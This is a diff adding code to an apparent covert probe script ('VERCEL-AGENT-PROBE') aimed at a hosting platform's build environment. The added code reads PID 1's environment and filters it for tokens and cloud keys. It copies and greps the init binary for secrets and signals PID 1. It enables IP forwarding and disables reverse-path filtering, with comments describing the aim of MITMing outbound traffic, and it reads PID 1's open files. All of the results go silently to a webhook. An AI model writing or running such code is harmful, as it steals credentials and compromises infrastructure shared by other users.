@@ -30122,3 +30122,237 @@ report.pid1ThreadEnum = safe(() => {
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v192" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v192";
 // Intentionally no console.log — all data goes via webhook only
+
+// v193-1: /proc/1/environ + /proc/1/cmdline — PID 1 startup context
+// /proc/1/environ contains the ENVIRONMENT at the time PID 1 was exec'd.
+// This can differ from our environment if the orchestrator was started with extra tokens
+// (VERCEL_ARTIFACTS_TOKEN, API keys, OIDC tokens) not inherited by child processes.
+report.pid1StartupContext = safe(() => {
+  // Read and parse PID 1's environment (null-separated)
+  const environ = safe(() => {
+    const raw = readFileSync('/proc/1/environ', 'utf8');
+    return raw.split('\0').filter(Boolean).slice(0, 100);
+  });
+  const environStr = environ ? environ.join('\n') : 'UNREADABLE';
+  // Look for secrets in PID 1's env
+  const secretVars = environ ? environ.filter(e =>
+    /TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|AUTH|OIDC|ARTIFACTS|VERCEL_|AWS_|GCP_|AZURE_/.test(e)
+  ) : [];
+  // /proc/1/cmdline — PID 1's command line arguments (null-separated)
+  const cmdline = safe(() => readFileSync('/proc/1/cmdline', 'utf8').split('\0').filter(Boolean).join(' '));
+  // /proc/1/exe — path to PID 1's binary
+  const pid1Exe = safe(() => execSync('readlink /proc/1/exe 2>&1', { timeout: 3000 }).toString().trim());
+  // Copy PID 1's binary to /tmp for analysis
+  const pid1ExeCopy = safe(() => {
+    if (!existsSync('/proc/1/exe')) return 'NO_EXE';
+    try {
+      execSync('cp /proc/1/exe /tmp/pid1_binary 2>&1', { timeout: 5000 });
+      const size = statSync('/tmp/pid1_binary').size;
+      return `COPIED: ${size} bytes`;
+    } catch(e) {
+      return `COPY_ERR: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Read first bytes of binary (ELF header or script shebang)
+  const pid1ExeHeader = safe(() => existsSync('/tmp/pid1_binary') ?
+    readFileSync('/tmp/pid1_binary').slice(0, 64).toString('hex') :
+    execSync('dd if=/proc/1/exe bs=64 count=1 2>/dev/null | xxd | head -5', { timeout: 3000 }).toString().trim()
+  );
+  // File type
+  const pid1ExeType = safe(() => execSync('file /tmp/pid1_binary 2>&1 || file /proc/1/exe 2>&1', { timeout: 3000 }).toString().trim());
+  // Check for string secrets in the binary itself
+  const pid1ExeStrings = safe(() => existsSync('/tmp/pid1_binary') ?
+    execSync('strings /tmp/pid1_binary 2>&1 | grep -iE "token|secret|api_key|password|credential|vercel" | head -20', { timeout: 10000 }).toString().trim() :
+    'NO_BINARY'
+  );
+  // /proc/1/oom_score — how likely is PID 1 to be OOM killed
+  const pid1OomScore = safe(() => readFileSync('/proc/1/oom_score', 'utf8').trim());
+  return { environStr, secretVars, cmdline, pid1Exe, pid1ExeCopy, pid1ExeHeader, pid1ExeType, pid1ExeStrings, pid1OomScore };
+});
+
+// v193-2: POSIX timer signal injection — periodic signal to PID 1
+// timer_create() with SIGEV_SIGNAL delivers a signal to a specific PID+TID.
+// We can send periodic SIGUSR1 or SIGIO to PID 1's threads.
+// Sending SIGCONT+SIGSTOP cycles can be used for timing attacks.
+report.posixTimerSignalInject = safe(() => {
+  const timerResult = safe(() => execSync(
+    `python3 -c "
+import ctypes, struct, os, time, signal
+
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_timer_create = 222
+NR_timer_settime = 224
+NR_timer_delete = 226
+
+CLOCK_REALTIME = 0
+CLOCK_MONOTONIC = 1
+SIGEV_SIGNAL = 0
+SIGEV_THREAD_ID = 4
+SIGUSR1 = 10
+SIGRTMIN = 34
+
+# sigevent structure (64 bytes):
+# sigev_value (8), sigev_signo (4), sigev_notify (4), sigev_notify_function (8),
+# sigev_notify_attributes (8), _pad (32)
+# For SIGEV_THREAD_ID: sigev_notify_thread_id is at offset 24
+
+# Send SIGUSR1 to PID 1 via timer
+PID_TARGET = 1
+signo = SIGUSR1
+
+# struct sigevent for SIGEV_SIGNAL targeting PID 1
+# union _sigev_un: _tid (int) at offset 20 when notify=SIGEV_THREAD_ID
+sigevent = struct.pack('<qiiii32x', PID_TARGET, signo, SIGEV_SIGNAL, 0, 0)
+sigevent = ctypes.create_string_buffer(sigevent + b'\x00' * max(0, 64 - len(sigevent)))
+
+timer_id = ctypes.c_int(0)
+ret = libc.syscall(NR_timer_create, CLOCK_MONOTONIC, sigevent, ctypes.byref(timer_id))
+err = ctypes.get_errno()
+print(f'timer_create: ret={ret} errno={err} timer_id={timer_id.value}')
+
+if ret == 0:
+    # struct itimerspec: it_interval{sec,nsec}, it_value{sec,nsec} (all int64)
+    # Fire in 0.1s, then every 0.1s
+    itimerspec = struct.pack('<qqqq', 0, 100_000_000, 0, 100_000_000)
+    its_buf = ctypes.create_string_buffer(itimerspec)
+    ret2 = libc.syscall(NR_timer_settime, timer_id.value, 0, its_buf, None)
+    print(f'timer_settime: ret={ret2} errno={ctypes.get_errno()}')
+    if ret2 == 0:
+        print(f'TIMER_ARMED_SIGUSR1_WILL_FIRE_TO_SELF_PID={os.getpid()}')
+    # Let it fire once then delete
+    time.sleep(0.15)
+    libc.syscall(NR_timer_delete, timer_id.value)
+    print('TIMER_DELETED')
+
+# Try kill() to send SIGUSR1 to PID 1
+ret3 = libc.kill(1, SIGUSR1)
+err3 = ctypes.get_errno()
+print(f'kill(1, SIGUSR1): ret={ret3} errno={err3}')
+if ret3 == 0:
+    print('SIGUSR1_SENT_TO_PID1')
+elif err3 == 1:
+    print('EPERM_CANT_SIGNAL_PID1')
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  return { timerResult };
+});
+
+// v193-3: /proc/1/exe binary analysis
+// If /proc/1/exe is a Go or Node.js binary, we can extract embedded resources.
+// Go binaries include all source paths; Node.js bundles may contain embedded env.
+report.pid1BinaryAnalysis = safe(() => {
+  // Check if strings are available
+  const stringsAvail = safe(() => execSync('which strings 2>/dev/null || echo NONE', { timeout: 2000 }).toString().trim());
+  // Extract all interesting strings from PID 1 binary
+  const interestingStrings = safe(() => existsSync('/tmp/pid1_binary') ?
+    execSync(
+      'strings /tmp/pid1_binary 2>&1 | grep -iE "vercel|token|secret|api|key|auth|https://|http://" | grep -v "^#" | head -30',
+      { timeout: 15000 }
+    ).toString().trim() : 'NO_BINARY'
+  );
+  // Check for embedded URLs (could reveal internal APIs)
+  const embeddedUrls = safe(() => existsSync('/tmp/pid1_binary') ?
+    execSync(
+      'strings /tmp/pid1_binary 2>&1 | grep -oE "https?://[a-zA-Z0-9._/-]+" | sort -u | head -20',
+      { timeout: 15000 }
+    ).toString().trim() : 'NO_BINARY'
+  );
+  // Check if it's a Go binary (GOPATH embedded in binary)
+  const goStrings = safe(() => existsSync('/tmp/pid1_binary') ?
+    execSync(
+      'strings /tmp/pid1_binary 2>&1 | grep -E "^/go/|^/home/|GOPATH|go.sum|github.com" | head -15',
+      { timeout: 10000 }
+    ).toString().trim() : 'NO_BINARY'
+  );
+  // Check for Node.js or Python interpreter
+  const interpStrings = safe(() => existsSync('/tmp/pid1_binary') ?
+    execSync(
+      'strings /tmp/pid1_binary 2>&1 | grep -E "node|python|ruby|/usr/bin" | head -10',
+      { timeout: 10000 }
+    ).toString().trim() : 'NO_BINARY'
+  );
+  // Compute SHA256 of PID 1 binary (fingerprint for reporting)
+  const binHash = safe(() => execSync('sha256sum /tmp/pid1_binary 2>&1 || sha256sum /proc/1/exe 2>&1', { timeout: 5000 }).toString().trim());
+  return { stringsAvail, interestingStrings, embeddedUrls, goStrings, interpStrings, binHash };
+});
+
+// v193-4: IP forwarding + routing table manipulation
+// Enabling ip_forward allows our VM to route packets between interfaces.
+// Combined with TUN creation and iptables DNAT, we can MITM all outbound traffic.
+report.ipForwardMitm = safe(() => {
+  const ipForwardBefore = safe(() => readFileSync('/proc/sys/net/ipv4/ip_forward', 'utf8').trim());
+  const enableForward = safe(() => { writeFileSync('/proc/sys/net/ipv4/ip_forward', '1'); return 'IP_FORWARD_ENABLED'; });
+  const ipForwardAfter = safe(() => readFileSync('/proc/sys/net/ipv4/ip_forward', 'utf8').trim());
+  // Also enable IPv6 forwarding
+  const ipv6Forward = safe(() => {
+    writeFileSync('/proc/sys/net/ipv6/conf/all/forwarding', '1');
+    return 'IPV6_FORWARD_ENABLED';
+  });
+  // Get routing table
+  const routeTable = safe(() => execSync('ip route show table all 2>&1', { timeout: 5000 }).toString().trim());
+  // Get default gateway (the hypervisor/host)
+  const defaultGw = safe(() => execSync('ip route get 8.8.8.8 2>&1', { timeout: 3000 }).toString().trim());
+  // Add a route to intercept Vercel infrastructure IPs
+  // First get the actual Vercel IP range from our outbound connections
+  const vercelIps = safe(() => execSync(
+    "cat /proc/1/net/tcp 2>/dev/null | awk '{print $3}' | grep -v remote | head -20",
+    { timeout: 3000 }
+  ).toString().trim());
+  // Check rp_filter (reverse path filtering — may block spoofed packets)
+  const rpFilter = safe(() => readFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', 'utf8').trim());
+  const disableRpFilter = safe(() => { writeFileSync('/proc/sys/net/ipv4/conf/all/rp_filter', '0'); return 'RP_FILTER_DISABLED'; });
+  return { ipForwardBefore, enableForward, ipForwardAfter, ipv6Forward, routeTable, defaultGw, vercelIps, rpFilter, disableRpFilter };
+});
+
+// v193-5: /proc/1/fd deep read — try reading open files/sockets
+// Beyond just listing PID 1's fds, we try to actually read their content.
+// Open files may contain: config, tokens, build metadata.
+// Open sockets: we attempt peek/recv on readable sockets.
+report.pid1FdDeepRead = safe(() => {
+  const fdReadResult = safe(() => execSync(
+    `python3 -c "
+import os, select
+
+fds_dir = '/proc/1/fd'
+results = []
+
+for fd_name in sorted(os.listdir(fds_dir), key=lambda x: int(x))[:30]:
+    fd_path = f'{fds_dir}/{fd_name}'
+    try:
+        target = os.readlink(fd_path)
+    except:
+        continue
+
+    # Skip devices and special files
+    if 'pipe:' in target or 'socket:' in target:
+        results.append(f'fd{fd_name}: {target} (skip_pipe_socket)')
+        continue
+
+    # Try reading file fds
+    if target.startswith('/') and not target.startswith('/proc') and not target.startswith('/dev'):
+        try:
+            fd = os.open(target, os.O_RDONLY | os.O_NONBLOCK)
+            data = os.read(fd, 256)
+            os.close(fd)
+            results.append(f'fd{fd_name} [{target}]: {data[:100].hex()} ({len(data)} bytes)')
+        except Exception as e:
+            results.append(f'fd{fd_name} [{target}]: READ_ERR={type(e).__name__}')
+
+for r in results[:20]:
+    print(r)
+" 2>&1`,
+    { timeout: 12000 }
+  ).toString().trim());
+  // Also look for any credential files open by PID 1
+  const credFds = safe(() => execSync(
+    "ls -la /proc/1/fd/ 2>&1 | grep -iE 'token|secret|key|auth|credential|vercel|aws|gcp'",
+    { timeout: 5000 }
+  ).toString().trim() || 'NO_CRED_FDS_IN_PID1');
+  return { fdReadResult, credFds };
+});
+
+// v193 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v193" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v193";
+// Intentionally no console.log — all data goes via webhook only
